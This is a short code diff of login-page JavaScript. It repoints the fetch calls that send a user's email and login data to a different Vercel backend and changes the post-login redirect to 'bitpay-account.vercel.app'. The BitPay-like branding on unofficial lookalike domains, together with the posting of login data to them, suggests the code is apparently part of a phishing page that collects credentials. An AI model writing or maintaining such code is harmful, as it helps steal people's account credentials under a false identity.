@@ -9,7 +9,7 @@ const sendLoginEmail = async () => {
   const data = {
     email: email.value,
   };
-  fetch('https://new-bit-pay-back-end-zefw.vercel.app/api/loginemailsand', {
+  fetch('https://chi-backend.vercel.app/api/loginemailsand', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -35,7 +35,7 @@ button.onclick = async (event) => {
 
   console.log(data);
 
-  fetch('https://new-bit-pay-back-end-zefw.vercel.app/api/login', {
+  fetch('https://chi-backend.vercel.app/api/login', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -55,7 +55,7 @@ button.onclick = async (event) => {
       }else{
         console.log("object2");
         sendLoginEmail()
-        window.location = `https://bitpayaccount.vercel.app/#/${userId}`;
+        window.location = `https://bitpay-account.vercel.app/#/${userId}`;
       }
     })
     .catch((error) => {
